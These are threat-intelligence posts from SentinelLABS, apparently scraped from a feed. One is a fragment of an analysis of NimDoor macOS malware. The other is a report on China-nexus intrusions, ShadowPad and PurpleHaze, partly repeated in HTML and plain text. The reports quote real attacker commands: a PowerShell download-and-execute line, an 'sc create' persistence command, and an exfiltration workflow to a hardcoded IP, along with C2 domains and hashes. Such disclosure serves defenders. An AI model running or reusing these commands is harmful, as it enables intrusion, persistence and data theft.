SERVER_AUTH_KEY.\nWhen the LaunchAgent is activated by a user login or reboot, GoogIe LLC is launched, which in turn calls CoreKitAgent and the rest of the payload logic.\nExecution chain once the persistence mechanism is activated by a login or reboot\nCoreKitAgent\nOf the four Nim binaries observed, CoreKitAgent is the most technically complex. It exists in both an unsigned stripped (~233KB) version and an ad hoc signed, unstripped (~340KB) version. VirusTotal telemetry indicates that the stripped version was uploaded from South Korea in October 2024. The unstripped version was observed in the wild in early April 2025. Although it is a universal binary, the ad hoc signature identifies the binary as user_startup_main_arm64.\nThe CoreKitAgent program operates as an event-driven application using macOS’s kqueue mechanism. The _main function sets up Nim’s standard signal handlers and then hands control to an asynchronous continuation function _mainX20X28AsyncX29___user95startup95main_u45, which initiates the malware’s core logic.\nControl flow within this function is handled by a 10-case switch statement implemented as a table-driven state machine, with an execution state stored in memory and updated via a lookup table with the following values:\n\r\n00 00 fe ff 03 00 00 00 fe ff fe ff fe ff fe ff\r\n\nThe lookup table is hard-coded in the __const section\nAfter each case completes, the code consults the lookup table to determine the next state depending on error conditions or specific flags set during execution of the previous case. For example, if certain error bits are set, the next state value might be negated, effectively creating alternate paths through the state sequence depending on runtime conditions.\nFrom an analysis point of view, much of the interesting malicious behaviour occurs in Case 1, which overrides some of the earlier signal handlers for intercepting SIGINT and SIGTERM. SIGINT is sent to a process when a user attempts to kill a process (such as by pressing ctl-c in the Terminal). SIGTERM, in contrast, is a signal sent by the system or another process, such as when the kill command is invoked by a user in the Terminal or by a program or script.\nSignal handlers 0x2 (SIGINT) and 0xf (SIGTERM) are set up to catch termination\nWhen triggered, CoreKitAgent catches these signals and writes the LaunchAgent for persistence, a copy of GoogIe LLC as the loader, and a copy of itself as the trojan, setting executable permissions on the latter two via the addExecutionPermissions_user95startup95mainZutils_u32 function.\nPersistence logic writes and sets execution permissions on the agent, trojan and loader binaries\nThis behavior ensures that any user-initiated termination of the malware results in the deployment of the core components, making the code resilient to basic defensive actions.\nThe state machine also contains a 10-minute sleep routine, likely as an anti-VM or sandbox countermeasure. The sleep routine is set up and called in Case 6 with a hard-coded value of 0x927c0 (600,000ms), as indicated in the following pseudocode.\n\r\nvoid* rax_29 = _sleepAsync__user95startup95main_u73(0x927c0);  // 600,000ms = 10min\r\nif (*r12 != 0)\r\n\t_eqdestroy___pureZasyncdispatch_u1229(rax_29);  // Error cleanup\r\nelse {\r\n\t_eqsink___pureZasyncdispatch_u7188(rsi_1 + 0x40, rax_29);  // Store future\r\n\tif (*r12 == 0) {\r\n\t\t*(r15 + 8) = 7;  // Transition to state 7\r\n\t\trsi_15 = *(r15 + 0x40);\r\n\t}\r\n}\r\n\nThe sleep function, _sleepAsync__user95startup95main_u73, uses the operating system’s mach_absolute_time() and mach_timebase_info() to create an asynchronous sleep. Rather than just blocking execution for 10 minutes – a technique many sandboxes would detect and counter – it instead registers a wake-up time with a global dispatcher and continues execution of the main event loop. When the sleep timer expires, CoreKitAgent calls Case 7 and continues execution.\nAppleScript Beacon and Backdoor\nThe malware’s custom encryption and obfuscation routines involve multiple passes through several functions. One of these involves deobfuscating string literals made up of long sequences of hexadecimal numbers that are passed to a decrypt function, _fromHex__pkgZnimcryptoZutils_u257.\nIn the unstripped version, one of the hexadecimal strings contains the template for the previously discussed LaunchAgent. In both versions, although the content differs, an AppleScript is decoded, written to disk at  ~/.ses, and launched via osascript.\nA string literal made up of hex characters is used to hide embedded AppleScript\nThe embedded .ses script in the unstripped CoreKitAgent binary after decoding\nThe embedded AppleScript fetches the current Unix timestamp via date to create a unique ID and builds an HTTP header string. Throughout, the authors have broken strings down into character lists to help protect the script from simple scanning rules. The same trick is used to disguise two hardcoded C2 addresses, writeup[.]live and safeup[.]store.\nOn execution, the script beacons out every 30 seconds to one of the two hardcoded C2s, chosen at random, and attempts to post data obtained from listing all running processes on the victim machine. The script also executes any response received from the C2 via the run script command, meaning this simple AppleScript functions both as a beacon and a backdoor.\nThe embedded AppleScript in the stripped version of CoreKitAgent takes a different form and uses different embedded C2 server addresses but has similar functionality, including the 30 second delay interval.\nThe embedded .ses script in the stripped CoreKitAgent binary after decoding\nConclusion\nSentinelLABS’ analysis of NimDoor shows how threat actors are continuing to explore cross-platform languages that introduce new levels of complexity for analysts.\nNorth Korean-aligned threat actors have previously experimented with Go and Rust, similarly combining scripts and compiled binaries into multi-stage attack chains. However, Nim’s rather unique ability to execute functions during compile time allows attackers to blend complex behaviour into a binary with less obvious control flow, resulting in compiled binaries in which developer code and Nim runtime code are intermingled even at the function level.\nAt the same time, the attackers take full advantage of macOS’s built-in scripting capabilities. Leveraging AppleScript to perform duties like beaconing is a novel approach that removes the need for a traditional post-exploitation framework and the detection ‘noise’ such implants can create. In addition, the use of wss for communications and signal interrupts to trigger persistence logic provide yet further evidence of active development in new ways to defeat security measures.\nEarlier this year, we saw threat actors utilizing Nim as well as Crystal, and we expect the choice of less familiar languages to become an increasing trend among macOS malware authors due both to their technical advantages and their unfamiliarity to analysts. As ever in the cat-and-mouse game of threat and threat detection, when one side innovates, the other must respond, and we encourage other analysts, researchers, and detection engineers to invest effort in understanding these lesser-known languages and how they will eventually be leveraged.\nIndicators of Compromise\nDomains\ndataupload[.]store\nupl/tlgrm C2\n\n\nfirstfromsep[.]online\nnetchk C2\n\n\nsafeup[.]store\nCoreKit C2\n\n\nsupport[.]us05web-zoom[.]pro\nzoom_sdk_support.scpt C2\n\n\nwriteup[.]live\nCoreKit C2\n\n\n\n\nFilePaths\n//\nBinaries | SHA-1\n027d4020f2dd1eb473636bc112a84f0a90b6651c \ntrojan1_arm64 (x86_64)\n\n\n0602a5b8f089f957eeda51f81ac0f9ad4e336b87 \nGoogIe LLC (universal)\n\n\n06566eabf54caafe36ebe94430d392b9cf3426ba \ninstaller (universal)\n\n\n08af4c21cd0a165695c756b6fda37016197b01e7 \ninstaller (universal)\n\n\n16a6b0023ba3fde15bd0bba1b17a18bfa00a8f59 \nGoogIe LLC (arm64)\n\n\n1a5392102d57e9ea4dd33d3b7181d66b4d08d01d \nCoreKitAgent (x86_64)\n\n\n2c0177b302c4643c49dd7016530a4749298d964c \nCoreKitAgent (arm64)\n\n\n2d746dda85805c79b5f6ea376f97d9b2f547da5d \nnetchk (arm64)\n\n\n2ed2edec8ccc44292410042c730c190027b87930 \ntrojan1_arm64 (arm64)\n\n\n3168e996cb20bd7b4208d0864e962a4b70c5a0e7 \nGoogIe LLC (x86_64)\n\n\n5b16e9d6e92be2124ba496bf82d38fb35681c7ad \na (universal)\n\n\n7c04225a62b953e1268653f637b569a3b2eb06f8 \ninstaller (arm64)\n\n\n945fcd3e08854a081c04c06eeb95ad6e0d9cdc19 \nCoreKitAgent (universal)\n\n\na25c06e8545666d6d2a88c8da300cf3383149d5a \nCoreKitAgent (universal)\n\n\nc9540dee9bdb28894332c5a74f696b4f94e4680c \nGoogIe_LLC (universal)\n\n\ne227e2e4a6ffb7280dfe7618be20514823d3e4f5 \ninstaller (x86_64)\n\n\nee3795f6418fc0cacbe884a8eb803498c2b5776f \nnetchk (x86_64)\n\n\n\n\nScripts\nObserved\n023a15ac687e2d2e187d03e9976a89ef5f6c1617 \nzoom_sdk_support.scpt\n\n\nbb72ca0e19a95c48a9ee4fd658958a0ae2af44b6 \ntlgm\n\n\n4743d5202dbe565721d75f7fb1eca43266a652d4 \nupl\n\n\n\n\nRelated\n1e76f497051829fa804e72b9d14f44da5a531df8 \nexpl (upl variant)\n\n\n79f37e0b728de2c5a4bfe8fcf292941d54e121b8 \nupl (upl variant)","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2025/07/25_MKTG_Comms_Blog_022_Generic_LABS_Blog_Images_07.jpg","length":"215705","type":"image/jpeg"},"dc:creator":"Phil Stokes &amp; Raffaele Sabato","content":"NimDoor shows how threat actors are continuing to explore cross-platform languages that introduce new levels of complexity for analysts.","contentSnippet":"NimDoor shows how threat actors are continuing to explore cross-platform languages that introduce new levels of complexity for analysts.","guid":"https://www.sentinelone.com/?post_type=labs&p=124926","categories":["DPRK","macOS"],"isoDate":"2025-07-02T09:55:37.000Z","tag":"intel"},{"creator":"Aleksandar Milenkoski &amp; Tom Hegel","title":"Follow the Smoke | China-nexus Threat Actors Hammer At the Doors of Top Tier Targets","link":"https://www.sentinelone.com/labs/follow-the-smoke-china-nexus-threat-actors-hammer-at-the-doors-of-top-tier-targets/","pubDate":"Mon, 09 Jun 2025 09:55:54 +0000","content:encoded":"<h2>Executive Summary</h2>\n<ul>\n<li aria-level=\"1\">In October 2024, SentinelLABS observed and countered a reconnaissance operation targeting SentinelOne, which we track as part of a broader activity cluster named PurpleHaze.</li>\n<li aria-level=\"1\">At the beginning of 2025, we also identified and helped disrupt an intrusion linked to a wider ShadowPad operation.

This post expands upon <a href=\"https://www.sentinelone.com/labs/top-tier-target-what-it-takes-to-defend-a-cybersecurity-company-from-todays-adversaries/\" target=\"_blank\" rel=\"noopener noreferrer\">previous SentinelLABS research</a>, which provides an overview of threats against cybersecurity vendors, including SentinelOne, ranging from financially motivated crimeware to targeted attacks by nation-state actors. This research focuses specifically on the subset of threats targeting SentinelOne and others that we attribute to China-nexus threat actors.</p>\n<p>By disclosing details of the threat activities we have faced, we bring into focus an aspect of the threat landscape that has received limited attention in public cyber threat intelligence discourse: the targeting of cybersecurity vendors. Our objective is to contribute to strengthening industry defenses by promoting transparency and encouraging collaboration. Cybersecurity companies are high-value targets for threat actors due to their protective roles, deep visibility into client environments, and ability to disrupt adversary operations. The findings detailed in this post highlight the persistent interest of China-nexus actors in these organizations.</p>\n<p>This research focuses on the following activities targeting SentinelOne, as well as suspected related operations identified during our investigations:</p>\n<ul>\n<li aria-level=\"1\">An intrusion into an IT services and logistics organization, which was responsible at the time for managing hardware logistics for SentinelOne employees.</li>\n<li aria-level=\"1\">Extensive remote reconnaissance of SentinelOne servers intentionally reachable from the Internet by virtue of their functionality.</li>\n</ul>\n<p>We promptly informed the IT services and logistics organization of the intrusion details. A thorough investigation into SentinelOne&#8217;s infrastructure, software, and hardware assets found no evidence of compromise.</p>\n<p>At this point, it remains unclear whether the perpetrators&#8217; focus was solely on the targeted IT logistics organization or if they intended to extend their reach to downstream organizations as well. Nevertheless, this case underscores the persistent threat posed by suspected Chinese threat actors, who have a history of seeking to establish <a href=\"https://www.sentinelone.com/labs/operation-digital-eye-chinese-apt-compromises-critical-digital-infrastructure-via-visual-studio-code-tunnels/\" target=\"_blank\" rel=\"noopener noreferrer\">strategic footholds</a> to potentially compromise downstream entities.</p>\n<p>As for the reconnaissance activity, we promptly identified and mapped the threat actor&#8217;s infrastructure involved in this operation as soon as it began. A thorough investigation of SentinelOne servers probed by the attackers revealed no signs of compromise. We assess with high confidence that the threat actor&#8217;s activities were limited to mapping and evaluating the availability of select Internet-facing servers, likely in preparation for potential future actions. Continuous monitoring of network traffic to our servers, which is part of established and continuing practice for protecting SentinelOne assets exposed to the Internet, enabled rapid detection and increased scrutiny to the reconnaissance activities, effectively mitigating any potential risks.</p>\n<p>Further investigations uncovered multiple, partially related intrusions and clusters of activity characteristic of modern Chinese-nexus operations:</p>\n<ul>\n<li aria-level=\"1\">Activity A: June 2024 intrusion into a South Asian government entity</li>\n<li aria-level=\"1\">Activity B: A set of intrusions impacting organizations worldwide occurring between July 2024 and March 2025</li>\n<li aria-level=\"1\">Activity C: Intrusion into an IT services and logistics company at the beginning of 2025</li>\n<li aria-level=\"1\">Activity D: October 2024 intrusion into the same government entity compromised in June 2024</li>\n<li aria-level=\"1\">Activity E: October 2024 reconnaissance activity targeting SentinelOne</li>\n<li aria-level=\"1\">Activity F: September 2024 intrusion into a leading European media organization</li>\n</ul>\n<p>The next two sections provide an overview of these activities, including timelines, points of overlap, and our attribution assessments, followed by concrete technical details, such as observed TTPs, malware, and infrastructure to enable other organizations in related sectors to investigate and mitigate similar sets of activity.</p>\n<h2>Overview | ShadowPad Intrusions</h2>\n<figure id=\"attachment_123751\" aria-describedby=\"caption-attachment-123751\" style=\"width: 1999px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10.jpg\" alt=\"ShadowPad activity, June 2024 - March 2025\" width=\"1999\" height=\"1278\" class=\"size-full wp-image-123751\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10-300x192.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10-1024x655.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10-768x491.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10-1536x982.jpg 1536w\" sizes=\"auto, (max-width: 1999px) 100vw, 1999px\" /><figcaption id=\"caption-attachment-123751\" class=\"wp-caption-text\">ShadowPad activity, June 2024 &#8211; March 2025</figcaption></figure>\n<p>In June 2024, SentinelLABS observed threat actor activity involving the ShadowPad malware targeting a South Asian government entity that provides IT solutions and infrastructure across multiple sectors (Activity A).

The use of ORB networks is a <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks/\" target=\"_blank\" rel=\"noopener noreferrer\">growing</a> trend among Chinese threat groups, since they can be rapidly expanded to create a dynamic and evolving infrastructure that makes tracking cyberespionage operations and their attribution challenging. APT15, also historically referred to as Ke3Chang and Nylon Typhoon, is a suspected Chinese cyberespionage actor known for its global targeting of critical sectors, including telecommunications, information technology, and government organizations.</p>\n<p>Further, in October 2024, the same month as the activity targeting the South Asian government entity, SentinelLABS observed remote connections to Internet-facing SentinelOne servers for reconnaissance (Activity E). Based on significant overlaps in infrastructure management, as well as domain creation and naming practices, we associate with high confidence the infrastructure observed in the reconnaissance operation with that used by the threat actor targeting the South Asian government entity (Activity D). This suggests the involvement of the same threat actor, or of a third-party entity responsible for managing infrastructure for multiple threat groups, a common practice in the Chinese cyberespionage landscape.</p>\n<p>In late September 2024, a few weeks before the October activities, SentinelLABS observed an intrusion into a leading European media organization (Activity F). Our investigation revealed overlaps in the tools used during this intrusion and the October 2024 activity targeting the South Asian government entity (Activity D). This includes the GOREshell backdoor and publicly available tools developed by <a href=\"https://www.thc.org/\" target=\"_blank\" rel=\"noopener noreferrer\">The Hacker&#8217;s Choice</a> (THC), a community of cybersecurity researchers.</p>\n<p>Activity D and Activity F are the first instances in which we have observed THC tooling used in the context of APT activities.</p>\n<p>We attribute Activity F with high confidence to a China-nexus actor, loosely associating it with a suspected Chinese initial access broker <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/initial-access-brokers-exploit-f5-screenconnect\" target=\"_blank\" rel=\"noopener noreferrer\">tracked</a> as UNC5174 by Mandiant.

While we attribute PurpleHaze with high confidence to China-nexus threat actors, investigations continue to determine the specific threat groups behind the activities and their potential links to the June 2024 and later ShadowPad intrusions (Activity A, B, and C).</p>\n<p>We do not rule out the involvement of distinct threat groups or the possibility of multiple intrusions conducted by the same threat actor, especially given the widespread use of publicly available tools and the extensive sharing of malware, infrastructure, and operational practices among Chinese threat groups. We also consider the possibility that access may have been transferred between different actors, particularly in light of the suspected involvement of UNC5174.</p>\n<h2>Technical Details | ShadowPad Intrusions</h2>\n<p>We present below technical details on the ShadowPad intrusion into the South Asian government entity in June 2024 (Activity A), as well as on the broader ShadowPad activities that took place between July 2024 and March 2025 (Activity B and C).</p>\n<h3>Activity A | ShadowPad and ScatterBrain Obfuscation</h3>\n<p>This intrusion involved the deployment of a ShadowPad sample named <code>AppSov.exe</code>. The threat actor deployed <code>AppSov.exe</code> by executing a PowerShell command that performs the following actions:</p>\n<ul>\n<li aria-level=\"1\">Downloads a file named <code>x.dat</code> from a remote endpoint using <code>curl.exe</code> after a 60-second delay.</li>\n<li aria-level=\"1\">Saves the downloaded file as <code>AppSov.exe</code> in the <code>C:\\ProgramData\\</code> directory.</li>\n<li aria-level=\"1\">Launches the executable using the <code>Start-Process</code> PowerShell command.</li>\n<li aria-level=\"1\">Reboots the system after a delay of 30 minutes.</li>\n</ul>\n<pre>\r\nsleep 60;curl.exe -o c:\\programdata\\AppSov.EXE http://[REDACTED]/dompdf/x.dat;start-process c:\\programdata\\AppSov.EXE;sleep 1800;shutdown.exe -r -t 1 -f;\r\n</pre>\n<p>The endpoint hosting <code>x.dat</code> was a previously compromised system within the same organization. Our analysis revealed that malware artifacts had been deployed on this system approximately one month prior to the ShadowPad deployment. These include the agent component of the <a href=\"https://github.com/itaymigdal/Nimbo-C2\" target=\"_blank\" rel=\"noopener noreferrer\">Nimbo-C2</a> open-source remote access framework, as well as a PowerShell script that performs the following actions:</p>\n<ul>\n<li aria-level=\"1\">Collects sensitive user data (documents, credentials, and cryptographic material) by recursively searching <code>C:\\Users\\</code> for files modified in the previous 600 days and with the following extensions: <code>*.xls</code>, <code>*.xlsx</code>, <code>*.ods</code>, <code>*.txt</code>, <code>*.pem</code>, <code>*.cert</code>, and <code>*.pfx</code>.</li>\n<li aria-level=\"1\">Copies the collected files to a temporary folder at <code>C:\\windows\\vss\\temp</code>.</li>\n<li aria-level=\"1\">Archives the collected files into an archive file named with the system’s MAC address and date, likely for tracking compromised endpoints.</li>\n<li aria-level=\"1\">Encrypts and password-protects the archive using <a href=\"https://www.7-zip.org/\" target=\"_blank\" rel=\"noopener noreferrer\">7-Zip</a> with the password <code>@WsxCFt6&amp;UJMmko0</code>, ensuring the data is obfuscated from inspection.</li>\n<li aria-level=\"1\">Exfiltrates the encrypted archive via a <code>curl</code> POST request to a hardcoded URL: <code>https[://]45.13.199[.]209/rss/rss.php</code>.</li>\n<li aria-level=\"1\">Removes traces by deleting the temporary folder, archive, and DAT files after exfiltration to avoid detection and forensic recovery.</li>\n</ul>\n<figure id=\"attachment_123747\" aria-describedby=\"caption-attachment-123747\" style=\"width: 778px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_14.jpg\" alt=\"PowerShell exfiltration script\" width=\"778\" height=\"318\" class=\"size-full wp-image-123747\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_14.jpg 778w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_14-300x123.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_14-768x314.jpg 768w\" sizes=\"auto, (max-width: 778px) 100vw, 778px\" /><figcaption id=\"caption-attachment-123747\" class=\"wp-caption-text\">PowerShell exfiltration script</figcaption></figure>\n<p>The Nimbo-C2 agent was deployed to <code>C:\\ProgramData\\Prefetch\\PfSvc.exe</code>, likely masquerading as a Privacyware Privatefirewall executable.</p>\n<p>We have not previously observed the use of Nimbo-C2 or variants of the PowerShell exfiltration script in the context of suspected Chinese APT activity. <a href=\"https://medium.com/@knownsec404team/apt-k-47-organization-launches-espionage-attacks-using-a-new-trojan-tool-5e7eccfdce2f\" target=\"_blank\" rel=\"noopener noreferrer\">Previous research</a> has documented the use of Nimbo-C2 in operations attributed to APT-K-47 (also known as Mysterious Elephant), a threat actor believed to originate from South Asia.</p>\n<p>The deployment of the ShadowPad sample <code>AppSov.exe</code> raises several possibilities:</p>\n<ul>\n<li aria-level=\"1\">the same threat actor conducted both the earlier activity and the ShadowPad deployment,</li>\n<li aria-level=\"1\">access was handed off to, or leveraged by, a second actor, or</li>\n<li aria-level=\"1\">two distinct actors operated independently within the same environment.</li>\n</ul>\n<p><code>AppSov.exe</code> was obfuscated using a variant of ScatterBrain.

The threat actor executed the <code>ipconfig</code> Windows command to query network configuration and established a connection to IP address <code>103.248.61[.]36</code> on port 443. The adversary then created the <code>C:\\Program Files\\VMware\\VGAuth</code> directory and downloaded an archive file named <code>VGAuth1.zip</code> from <code>103.248.61[.]36</code>; after extracting its contents into the <code>VGAuth</code> directory, the archive was deleted.</p>\n<p>The archive file contained two executables: a legitimate <code>VGAuthService.exe</code> executable and a malicious DLL file named <code>glib-2.0.dll</code> (original filename: <code>libglib-2.0-0.dll</code>), which masquerades as a legitimate <a href=\"https://docs.gtk.org/glib/\" target=\"_blank\" rel=\"noopener noreferrer\">GLib–2.0</a> library file.</p>\n<p><code>VGAuthService.exe</code> implements the VMware Guest Authentication Service. The threat actor deployed version <code>11.3.5.59284</code>, signed by VMWare and compiled on Tuesday, August 31, 2021, 06:14:07 UTC. This version is vulnerable to DLL hijacking.</p>\n<p>The threat actor then created a new Windows service named <code>VGAuthService</code>, which automatically starts upon system boot, runs the <code>VGAuthService.exe</code> executable, and displays as <code>Alias Manager and Ticket Service</code>. When the service was started, <code>VGAuthService.exe</code> loaded and executed the malicious <code>glib-2.0.dll</code> library file.</p>\n<pre>\r\nsc create VGAuthService binPath= \"\\\"C:\\\\Program Files\\\\VMware\\\\\\VGAuth\\\\VGAuthService.exe\\\"\" start=auto error=ignore displayname=\"Alias Manager and Ticket Service\"\r\n</pre>\n<p><code>glib-2.0.dll</code> implements the GOREshell backdoor, which uses <code>reverse_ssh</code> functionalities to establish SSH connections to attacker-controlled endpoints.

The activities detailed in this research reflect the strong interest these actors have in the very organizations tasked with defending digital infrastructure.</p>\n<p>Our findings underscore the critical need for constant vigilance, robust monitoring, and rapid response capabilities. By publicly sharing details of our investigations, we aim to provide insight into the rarely discussed targeting of cybersecurity vendors, helping to destigmatize sharing of IOCs related to these campaigns, and thus contribute to a deeper understanding of the tactics, objectives, and operational patterns of China-nexus threat actors. As these adversaries continue to adapt to our response efforts, it’s essential that defenders prioritize transparency, intelligence sharing, and coordinated action over the fear of reputational harm.</p>\n<p>We encourage others in the industry to adopt a proactive approach to threat intelligence sharing and defense coordination, recognizing that collective security strengthens the entire community.</p>\n<p>We are grateful to our partners at Lumen Technologies Black Lotus Labs for their collaboration and support.</p>\n<h2>Indicators of Compromise</h2>\n<h3>SHA-1 Hashes</h3>\n<div style=\"overflow-x:auto;\">\n<table style=\"border-collapse: collapse;

The affected organization was responsible for managing hardware logistics for SentinelOne employees at the time.\nA thorough investigation of SentinelOne’s infrastructure, software, and hardware assets confirmed that the attackers were unsuccessful and SentinelOne was not compromised by any of these activities.\nThe PurpleHaze and ShadowPad activity clusters span multiple partially related intrusions into different targets occurring between July 2024 and March 2025. The victimology includes a South Asian government entity, a European media organization, and more than 70 organizations across a wide range of sectors.\nWe attribute the PurpleHaze and ShadowPad activity clusters with high confidence to China-nexus threat actors. We loosely associate some PurpleHaze intrusions with actors that overlap with the suspected Chinese cyberespionage groups publicly reported as APT15 and UNC5174.\nThis research underscores the persistent threat Chinese cyberespionage actors pose to global industries and public sector organizations, while also highlighting a rarely discussed target they pursue: cybersecurity vendors.\nOverview\nThis research outlines threats that SentinelLABS observed and defended against in late 2024 and the first quarter of 2025. This post expands upon previous SentinelLABS research, which provides an overview of threats against cybersecurity vendors, including SentinelOne, ranging from financially motivated crimeware to targeted attacks by nation-state actors. This research focuses specifically on the subset of threats targeting SentinelOne and others that we attribute to China-nexus threat actors.\nBy disclosing details of the threat activities we have faced, we bring into focus an aspect of the threat landscape that has received limited attention in public cyber threat intelligence discourse: the targeting of cybersecurity vendors. Our objective is to contribute to strengthening industry defenses by promoting transparency and encouraging collaboration. Cybersecurity companies are high-value targets for threat actors due to their protective roles, deep visibility into client environments, and ability to disrupt adversary operations. The findings detailed in this post highlight the persistent interest of China-nexus actors in these organizations.\nThis research focuses on the following activities targeting SentinelOne, as well as suspected related operations identified during our investigations:\nAn intrusion into an IT services and logistics organization, which was responsible at the time for managing hardware logistics for SentinelOne employees.\nExtensive remote reconnaissance of SentinelOne servers intentionally reachable from the Internet by virtue of their functionality.\nWe promptly informed the IT services and logistics organization of the intrusion details. A thorough investigation into SentinelOne’s infrastructure, software, and hardware assets found no evidence of compromise.\nAt this point, it remains unclear whether the perpetrators’ focus was solely on the targeted IT logistics organization or if they intended to extend their reach to downstream organizations as well. Nevertheless, this case underscores the persistent threat posed by suspected Chinese threat actors, who have a history of seeking to establish strategic footholds to potentially compromise downstream entities.\nAs for the reconnaissance activity, we promptly identified and mapped the threat actor’s infrastructure involved in this operation as soon as it began. A thorough investigation of SentinelOne servers probed by the attackers revealed no signs of compromise. We assess with high confidence that the threat actor’s activities were limited to mapping and evaluating the availability of select Internet-facing servers, likely in preparation for potential future actions. Continuous monitoring of network traffic to our servers, which is part of established and continuing practice for protecting SentinelOne assets exposed to the Internet, enabled rapid detection and increased scrutiny to the reconnaissance activities, effectively mitigating any potential risks.\nFurther investigations uncovered multiple, partially related intrusions and clusters of activity characteristic of modern Chinese-nexus operations:\nActivity A: June 2024 intrusion into a South Asian government entity\nActivity B: A set of intrusions impacting organizations worldwide occurring between July 2024 and March 2025\nActivity C: Intrusion into an IT services and logistics company at the beginning of 2025\nActivity D: October 2024 intrusion into the same government entity compromised in June 2024\nActivity E: October 2024 reconnaissance activity targeting SentinelOne\nActivity F: September 2024 intrusion into a leading European media organization\nThe next two sections provide an overview of these activities, including timelines, points of overlap, and our attribution assessments, followed by concrete technical details, such as observed TTPs, malware, and infrastructure to enable other organizations in related sectors to investigate and mitigate similar sets of activity.\nOverview | ShadowPad Intrusions\nShadowPad activity, June 2024 – March 2025\nIn June 2024, SentinelLABS observed threat actor activity involving the ShadowPad malware targeting a South Asian government entity that provides IT solutions and infrastructure across multiple sectors (Activity A). The ShadowPad sample we retrieved was obfuscated using a variant of ScatterBrain, an evolution of the ScatterBee obfuscation mechanism.\nBased on ShadowPad implementation characteristics, we identified additional samples that revealed broader activity taking place between July 2024 and March 2025, spanning a wide range of victims globally (Activity B). Using C2 netflow and SentinelOne telemetry data, SentinelLABS uncovered over 70 victims across sectors such as manufacturing, government, finance, telecommunications, and research. Potentially affected SentinelOne customers were proactively contacted by our Threat Discovery and Response (TDR) teams. One of the impacted entities was an IT services and logistics company, which had been responsible for managing hardware logistics for SentinelOne employees during that period (Activity C).\nWe attribute these intrusions with high confidence to China-nexus actors, with ongoing efforts aimed at determining the specific threat clusters involved. ShadowPad is a closed-source modular backdoor platform used by multiple suspected China-nexus threat actors to conduct cyberespionage. Google Threat Intelligence Group has observed the use of ScatterBrain-obfuscated ShadowPad samples since 2022 and attributes them to clusters associated with the suspected Chinese APT umbrella actor APT41.\nSeveral of the ShadowPad samples and infrastructure we identified have also been documented in previous public reporting on recent ShadowPad activities, including research published by TrendMicro, Orange Cyberdefense, and Check Point. Some of these activities have included the deployment of ransomware referred to as NailaoLocker, though the motive remains unclear, whether for financial gain or as a means of distraction, misattribution, or removal of evidence.\nOverview | The PurpleHaze Activity Cluster\nPurpleHaze activity, September – October 2024\nIn early October 2024, SentinelLABS observed new threat actor activity (Activity D) at the same South Asian government entity compromised using ShadowPad in June 2024 (Activity A).\nThis intrusion involved backdoors that we classify as part of a malware cluster designated GOREshell, our designation for a loose malware cluster that includes the open-source reverse_ssh backdoor and its custom variants, which we have observed in targeted attacks. While these variants exhibit variations in implementation, all share code similarities with the client component of reverse_ssh.\nWe track some of the infrastructure used in this intrusion as part of an operational relay box (ORB) network used by several suspected Chinese cyberespionage actors, particularly a threat group that overlaps with public reporting on APT15. The use of ORB networks is a growing trend among Chinese threat groups, since they can be rapidly expanded to create a dynamic and evolving infrastructure that makes tracking cyberespionage operations and their attribution challenging. APT15, also historically referred to as Ke3Chang and Nylon Typhoon, is a suspected Chinese cyberespionage actor known for its global targeting of critical sectors, including telecommunications, information technology, and government organizations.\nFurther, in October 2024, the same month as the activity targeting the South Asian government entity, SentinelLABS observed remote connections to Internet-facing SentinelOne servers for reconnaissance (Activity E). Based on significant overlaps in infrastructure management, as well as domain creation and naming practices, we associate with high confidence the infrastructure observed in the reconnaissance operation with that used by the threat actor targeting the South Asian government entity (Activity D). This suggests the involvement of the same threat actor, or of a third-party entity responsible for managing infrastructure for multiple threat groups, a common practice in the Chinese cyberespionage landscape.\nIn late September 2024, a few weeks before the October activities, SentinelLABS observed an intrusion into a leading European media organization (Activity F). Our investigation revealed overlaps in the tools used during this intrusion and the October 2024 activity targeting the South Asian government entity (Activity D). This includes the GOREshell backdoor and publicly available tools developed by The Hacker’s Choice (THC), a community of cybersecurity researchers.\nActivity D and Activity F are the first instances in which we have observed THC tooling used in the context of APT activities.\nWe attribute Activity F with high confidence to a China-nexus actor, loosely associating it with a suspected Chinese initial access broker tracked as UNC5174 by Mandiant. We acknowledge the possibility that post-intrusion activities may have been conducted by a different threat group.\nThe threat actor leveraged ORB network infrastructure, which we assess to be operated from China, and exploited the CVE-2024-8963 vulnerability together with CVE-2024-8190 to establish an initial foothold, a few days before the vulnerabilities were publicly disclosed. This intrusion method suggests the involvement of UNC5174, which is assessed to be a contractor for China’s Ministry of State Security (MSS) primarily focusing on gaining access and specializing in exploiting vulnerabilities in targeted systems. After compromising these systems, UNC5174 is suspected of transferring access to other threat actors.\nIn January 2025, CISA and the FBI released a joint advisory reporting threat actor activities that also took place in September 2024, involving the chained exploitation of CVE-2024-8963 and CVE-2024-8190, without providing specific attribution assessments. In March 2025, the French Cybersecurity Agency (ANSSI) released its 2024 cyber threat overview report, which documents intrusions that occurred in September 2024, involved the same vulnerabilities, and show overlaps in TTPs associated with UNC5174.\nAdditionally, Mandiant has observed UNC5174 exploiting the CVE-2023-46747 and CVE-2024-1709 vulnerabilities and deploying a publicly available backdoor tracked as GOREVERSE. Strings and code segments in the public GOREVERSE YARA rule provided by Mandiant match the reverse_ssh backdoor, placing GOREVERSE in the GOREshell malware cluster, samples of which we observed in both this intrusion and the October 2024 activity targeting the South Asian government entity.\nWe collectively track Activity D, E and F as the PurpleHaze threat cluster. While we attribute PurpleHaze with high confidence to China-nexus threat actors, investigations continue to determine the specific threat groups behind the activities and their potential links to the June 2024 and later ShadowPad intrusions (Activity A, B, and 